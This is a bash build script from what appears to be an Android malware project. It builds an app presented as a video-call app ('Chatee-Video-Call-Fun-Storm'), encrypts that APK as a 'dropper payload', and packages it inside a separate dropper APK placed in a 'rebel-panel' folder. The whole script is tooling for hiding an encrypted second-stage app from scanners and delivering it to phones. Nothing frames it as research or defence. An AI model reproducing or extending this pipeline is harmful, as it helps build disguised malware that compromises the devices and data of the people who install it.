#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."
INNER="${1:-rebel-panel/Chatee-Video-Call-Fun-Storm.apk}"
if [[ ! -f "$INNER" ]]; then
  echo "Building inner Chatee APK..."
  ./gradlew :app:assembleRelease --no-daemon
  cp app/build/outputs/apk/release/app-release.apk "$INNER"
fi
python3 scripts/encrypt_dropper_payload.py "$INNER"
./gradlew :dropper:assembleRelease --no-daemon
OUT=dropper/build/outputs/apk/release/dropper-release.apk
cp "$OUT" rebel-panel/Chatee-Storm-Dropper.apk
echo "Dropper APK: rebel-panel/Chatee-Storm-Dropper.apk"
